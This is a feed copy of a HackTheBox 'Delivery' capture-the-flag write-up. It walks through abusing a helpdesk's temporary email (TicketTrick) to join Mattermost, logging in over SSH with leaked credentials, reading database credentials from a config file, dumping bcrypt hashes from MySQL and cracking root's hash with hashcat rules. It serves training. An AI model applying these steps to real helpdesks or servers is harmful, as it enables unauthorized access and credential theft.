-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</guid>
-      <description>Exploiting a logic flaw called TicketTrick</description>
-      <content:encoded><![CDATA[<p>Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">Inti De Ceukelaire</a>.</p>
-<p>On this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I&rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I&rsquo;m able to crack the password and obtain root access.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>TicketTrick</li>
-<li>Generating wordlist using hashcat</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li><a href="https://hashcat.net/">hashcat</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p><code>nmap</code> full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «delivery» «10.10.14.70» 
-$ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT
-....
-PORT     STATE SERVICE REASON         VERSION
-22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
-8065/tcp open  unknown syn-ack ttl 63
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge
-SF:nericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
-SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
-SF:20Request&#34;)%r(GetRequest,DF3,&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
-....
-
-→ root@kali «delivery» «10.10.14.70» 
-$ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT
-Nmap scan report for 10.10.10.222
-Host is up, received echo-reply ttl 63 (0.45s latency).
-
-PORT     STATE SERVICE REASON
-22/tcp   open  ssh     syn-ack ttl 63
-| ssh-hostkey: 
-|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
-|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
-|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
-80/tcp   open  http    syn-ack ttl 63
-|_http-title: Welcome
-8065/tcp open  unknown syn-ack ttl 63
-</code></pre></div><p>I can clearly see the fingerprint of port 8065 indicate that it&rsquo;s a HTTP server. I can confirm it with <code>curl</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
-$ curl -sI 10.10.10.222:8065
-HTTP/1.1 <span style="color:#ae81ff">405</span> Method Not Allowed
-Date: Fri, <span style="color:#ae81ff">21</span> May <span style="color:#ae81ff">2021</span> 19:09:14 GMT
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>This page is a static website.</p>
-<p><img class="img-container" src="imgs/image-20210522022202624.png" alt="image-20210522022202624"  />
-</p>
-<p>The text “HELPDESK” points to <code>http://helpdesk.delivery.htb/ </code>.  Clicking on the &ldquo;CONTACT US&rdquo; flips the homepage to this views:</p>
-<p><img class="img-container" src="imgs/image-20210522022535948.png" alt="image-20210522022535948"  />
-</p>
-<p>The text “MatterMost server” points to <code>http://delivery.htb:8065</code>.</p>
-<p>I can use <code>curl</code> and <code>grep</code> command to grab all the links/URL from this page.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
-$ curl -s 10.10.10.222 | grep -Eo <span style="color:#e6db74">&#39;href=&#34;[^\&#34;]+&#34;&#39;</span> | grep -v <span style="color:#e6db74">&#39;#&#39;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/main.css&#34;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/ie9.css&#34;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/noscript.css&#34;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://helpdesk.delivery.htb&#34;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://helpdesk.delivery.htb&#34;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://delivery.htb:8065&#34;</span>
-href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://html5up.net&#34;</span>
-</code></pre></div><p>I’ll add the newly discovered hostnames to my <code>/etc/hosts</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
-$ echo <span style="color:#e6db74">&#39;10.10.10.222 delivery.htb helpdesk.delivery.htb&#39;</span> &gt; /etc/hosts
-</code></pre></div><p>Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
-$ curl -s http://10.10.10.222/ | wc -c
-<span style="color:#ae81ff">10850</span>
-→ root@kali «delivery» «10.10.14.70» 
-$ curl -s http://delivery.htb/ | wc -c
-<span style="color:#ae81ff">10850</span>
-→ root@kali «delivery» «10.10.14.70» 
-$ curl -s http://helpdesk.delivery.htb/ | wc -c
-<span style="color:#ae81ff">4933</span>
-</code></pre></div><p>There is only one page that has different in size.</p>
-<p>I did a <code>gobuster</code> scan but find nothing useful in the results, so I&rsquo;ll move to the next prt.</p>
-<h3 id="tcp-80---helpdeskdeliveryhtb">TCP 80 - helpdesk.delivery.htb</h3>
-<p>There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by <a href="https://osticket.com/">osTicket</a>.</p>
-<p><img class="img-container" src="imgs/image-20210522024708233.png" alt="image-20210522024708233"  />
-</p>
-<p>The &ldquo;Open a New Ticket&rdquo; menu.</p>
-<p><img class="img-container" src="imgs/image-20210522025616599.png" alt="image-20210522025616599"  />
-</p>
-<p>The &ldquo;Check Ticket Status&rdquo; menu.</p>
-<p><img class="img-container" src="imgs/image-20210522025147588.png" alt="image-20210522025147588"  />
-</p>
-<h4 id="open-a-new-ticket">Open a New Ticket</h4>
-<p>According to the message at <code>http://delivery.htb/#contact-us</code>, guest user seems to be allowed to create a ticket here.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">For unregistered users, please use our HelpDesk to get in touch with our team. 
-Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.
-</code></pre></div><p>I&rsquo;ll create one.</p>
-<p><img class="img-container" src="imgs/image-20210522030005601.png" alt="image-20210522030005601"  />
-</p>
-<p>Once the ticket request is submitted, it notifies that the ticket has been created.</p>
-<p><img class="img-container" src="imgs/image-20210522030208711.png" alt="image-20210522030208711"  />
-</p>
-<p>Besides the ticket id, it also gives us a temporary email with domain of <code>delivery.htb</code>, and I&rsquo;ll note that:</p>
-<ul>
-<li>Ticket : 4709941</li>
-<li>Email: <a href="mailto:4709941@delivery.htb">4709941@delivery.htb</a>.</li>
-</ul>
-<p>The created ticket can be accessed/viewed on “Check Ticket Status” menu.</p>
-<p><img class="img-container" src="imgs/image-20210522030510810.png" alt="image-20210522030510810"  />
-</p>
-<h3 id="finding-vulnerabilities---exploit-db">Finding vulnerabilities - Exploit-DB</h3>
-<p>The app source code is available on Github: <a href="https://github.com/osTicket/osTicket">https://github.com/osTicket/osTicket</a>. But, it seems I&rsquo;ll need an admin access to find the version.</p>
-<p>You guess it, we can limit the search based on the box release (9 January 2021):</p>
-<p><img class="img-container" src="imgs/image-20210522031957741.png" alt="image-20210522031957741"  />
-</p>
-<p>But those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.</p>
-<h3 id="tcp-8065--mattermost">TCP 8065 — Mattermost</h3>
-<p>There is an instance of Mattermost here and it requires an account.</p>
-<p><img class="img-container" src="imgs/image-20210522032634304.png" alt="image-20210522032634304"  />
-</p>
-<p>Sign up is allowed, but the page clearly shows that valid email is required.</p>
-<p><img class="img-container" src="imgs/image-20210522032749098.png" alt="image-20210522032749098"  />
-</p>
-<p>And here is why a valid email is required, there is a verification process.</p>
-<p><img class="img-container" src="imgs/image-20210522033006957.png" alt="image-20210522033006957"  />
-</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-maildeliverer">Shell as maildeliverer</h3>
-<h4 id="access-to-mattermost-using-tickettrick">Access to Mattermost using TicketTrick</h4>
-<p>The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.</p>
-<p>For me, the previous email is: <code>4709941@delivery.htb</code>. I’ll use that to register on Mattermost.</p>
-<p><img class="img-container" src="imgs/image-20210522034638745.png" alt="image-20210522034638745"  />
-</p>
-<p>The verification is sent to <code>4709941@delivery.htb</code>.</p>
-<p><img class="img-container" src="imgs/image-20210522034704297.png" alt="image-20210522034704297"  />
-</p>
-<p>Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.</p>
-<p><img class="img-container" src="imgs/image-20210522034915465.png" alt="image-20210522034915465"  />
-</p>
-<p>Visiting <code>http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9&amp;email=4709941%40delivery.htb</code> redirects back to MatterMost which confirms the email has been verified.</p>
-<p><img class="img-container" src="imgs/image-20210522035035109.png" alt="image-20210522035035109"  />
-</p>
-<p>Upon logging in, I&rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.</p>
-<p><img class="img-container" src="imgs/image-20210522035330637.png" alt="image-20210522035330637"  />
-</p>
-<p>The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.</p>
-<h4 id="ssh---maildeliverer">SSH - maildeliverer</h4>
-<p>The credentials of maildeliverer works on SSH.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «delivery» «10.10.14.70» 
-$ ssh maildeliverer@delivery.htb
-...
-maildeliverer@delivery.htb&#39;s password: 
-Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
-
-...
-Last login: Fri May 21 14:11:23 2021 from 10.10.16.16
-maildeliverer@Delivery:~$ id
-uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
-</code></pre></div><p>The user flag is done here.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">maildeliverer@Delivery:~$ ls -l
-total 4
--r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt
-</code></pre></div><p><img class="img-container" src="imgs/image-20210522040053221.png" alt="image-20210522040053221"  />
-</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>Enumerating on <code>/opt</code> finds the Mattermost installation folder. The Mattermost config file contains the database credentials.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep SqlSetting -A10
-    <span style="color:#e6db74">&#34;SqlSettings&#34;</span>: <span style="color:#f92672">{</span>
-        <span style="color:#e6db74">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
-        <span style="color:#e6db74">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
-        <span style="color:#e6db74">&#34;DataSourceReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
-        <span style="color:#e6db74">&#34;DataSourceSearchReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
-        <span style="color:#e6db74">&#34;MaxIdleConns&#34;</span>: 20,
-        <span style="color:#e6db74">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
-        <span style="color:#e6db74">&#34;MaxOpenConns&#34;</span>: 300,
-        <span style="color:#e6db74">&#34;Trace&#34;</span>: false,
-        <span style="color:#e6db74">&#34;AtRestEncryptKey&#34;</span>: <span style="color:#e6db74">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
-        <span style="color:#e6db74">&#34;QueryTimeout&#34;</span>: 30,
-</code></pre></div><p>The credentials is <code>mmuser:Crack_The_MM_Admin_PW</code>.</p>
-<h4 id="mysql---dump-passwords">MySQL - Dump Passwords</h4>
-<p>With database credentials, I can connect to the MySQL service.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">maildeliverer<span style="color:#f92672">@</span>Delivery:<span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>mattermost<span style="color:#f92672">/</span>config<span style="color:#960050;background-color:#1e0010">$</span> mysql mattermost <span style="color:#f92672">-</span>u mmuser <span style="color:#f92672">-</span>pCrack_The_MM_Admin_PW
-Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> completion of <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> names
-You can turn off this feature <span style="color:#66d9ef">to</span> get a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A
-
-Welcome <span style="color:#66d9ef">to</span> the MariaDB monitor.  Commands end <span style="color:#66d9ef">with</span> ; <span style="color:#66d9ef">or</span> <span style="color:#960050;background-color:#1e0010">\</span>g.
-Your MariaDB connection id <span style="color:#66d9ef">is</span> <span style="color:#ae81ff">395</span>
-Server version: <span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">3</span>.<span style="color:#ae81ff">27</span><span style="color:#f92672">-</span>MariaDB<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">+</span>deb10u1 Debian <span style="color:#ae81ff">10</span>
-
-<span style="color:#a6e22e">Copyright</span> (c) <span style="color:#ae81ff">2000</span>, <span style="color:#ae81ff">2018</span>, Oracle, MariaDB Corporation Ab <span style="color:#66d9ef">and</span> others.
-
-Type <span style="color:#e6db74">&#39;help;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> <span style="color:#66d9ef">to</span> clear the current input statement.
-
-MariaDB [mattermost]<span style="color:#f92672">&gt;</span>
-</code></pre></div><p>There is a users table which usually contains something juicy.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
-<span style="color:#f92672">+------------------------+</span>
-<span style="color:#f92672">|</span> Tables_in_mattermost   <span style="color:#f92672">|</span>
-<span style="color:#f92672">+------------------------+</span>
-...
-<span style="color:#f92672">|</span> Users                  <span style="color:#f92672">|</span>
-<span style="color:#f92672">+------------------------+</span>
-<span style="color:#ae81ff">46</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
-</code></pre></div><p>I can get the columns of the table user by querying <code>describe Users;</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">describe</span> Users;
-<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
-<span style="color:#f92672">|</span> Field              <span style="color:#f92672">|</span> Type         <span style="color:#f92672">|</span> <span style="color:#66d9ef">Null</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Key</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Default</span> <span style="color:#f92672">|</span> Extra <span style="color:#f92672">|</span>
-<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
-<span style="color:#f92672">|</span> Id                 <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">26</span>)  <span style="color:#f92672">|</span> NO   <span style="color:#f92672">|</span> PRI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> CreateAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> UpdateAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> DeleteAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> Username           <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> UNI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> Password           <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
-...
-<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
-<span style="color:#ae81ff">25</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
-</code></pre></div><p>I&rsquo;ll dump that the username and password columns from the table Users.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> Username,Password <span style="color:#66d9ef">from</span> Users;
-<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
-<span style="color:#f92672">|</span> Username                         <span style="color:#f92672">|</span> Password                                                     <span style="color:#f92672">|</span>
-<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
-<span style="color:#f92672">|</span> surveybot                        <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> c3ecacacc7b94f909d04dbfd308a9b93 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>b785171bfb34762a933e127630c4860 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>m0quqyvCE8Z<span style="color:#f92672">/</span>R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS<span style="color:#f92672">/</span>G <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> testmail                         <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>gSBaz3a76sX.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> help                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>zsb4KbggZbpQi2Wa8W0.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> root                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>VM6EeymRxJ29r8Wjkr8Dtev0O.<span style="color:#ae81ff">1</span>STWb4.<span style="color:#ae81ff">4</span>ScG.anuu7v0EFJwgjjO <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> ff0a21fc6fc2488195e16ea854c963ee <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> channelexport                    <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> <span style="color:#ae81ff">9</span>ecfb4be145d47fda0724f697f35ffaf <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> aaaa                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>yIdqqOXl.<span style="color:#ae81ff">5</span>dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6 <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> iiamf                            <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>esA8d<span style="color:#f92672">/</span>l5.IKQJIhnl2SeYeeoFaCOE6Z<span style="color:#f92672">/</span>esUOSuRb.Vqtkf3gvbli6 <span style="color:#f92672">|</span>
-<span style="color:#f92672">|</span> iamf                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>ZYEM.GLMnAfq8eM.<span style="color:#ae81ff">2</span>rs8q.e<span style="color:#f92672">/</span>q3bHaOVOCvlu7YGhU0rU0Ug4PME9a <span style="color:#f92672">|</span>
-<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
-<span style="color:#ae81ff">12</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">000</span> sec)
-
-MariaDB [mattermost]<span style="color:#f92672">&gt;</span>
-</code></pre></div><p>Those are bcrypt hashes, but let’s prioritize the root hash.</p>
-<h4 id="cracking-the-hash">Cracking the Hash</h4>
-<p>Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.</p>
-<p>I remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on <a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=730s">Forest</a> .</p>
-<p>Now the idea is instead of generating seasonal passwords, I can try to generate a few variant of &ldquo;PleaseSubscribe!&rdquo; and use them for cracking.</p>
-<p>So, I&rsquo;ll start by calculating the length of “PleaseSubscribe!”.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
-$ echo -n <span style="color:#e6db74">&#39;PleaseSubsribe!&#39;</span> | wc -c
-<span style="color:#ae81ff">15</span>
-</code></pre></div><p>It has length of 15. I&rsquo;ll save the &ldquo;PleaseSubscribe!&rdquo; string to a file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
-$ echo <span style="color:#e6db74">&#39;PleaseSubscribe!&#39;</span> &gt; IppsecSubscriber
-</code></pre></div><p>Then I’ll feed that file to <code>hashcat</code> to generate some new variant of it using base64 rule, and I&rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called <code>custom_wordlist</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
-→ root@kali «delivery» «10.10.14.70»
-$ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout | awk <span style="color:#e6db74">&#39;length($0) &gt; 15&#39;</span> &gt; custom_wordlist
-</code></pre></div><p>It produces 46 words.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
-$ wc -w custom_wordlist
-<span style="color:#ae81ff">46</span> custom_wordlist
-</code></pre></div><p>With that wordlist the hash gets cracked instantly!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\t</span>ools<span style="color:#ae81ff">\h</span>ashcat6&gt;hashcat.exe -m <span style="color:#ae81ff">3200</span> <span style="color:#e6db74">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span> custom_wordlist --force
-
-....
-$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
-Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
-Time.Started.....: Mon Mar <span style="color:#ae81ff">15</span> 21:36:35 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> sec<span style="color:#f92672">)</span>
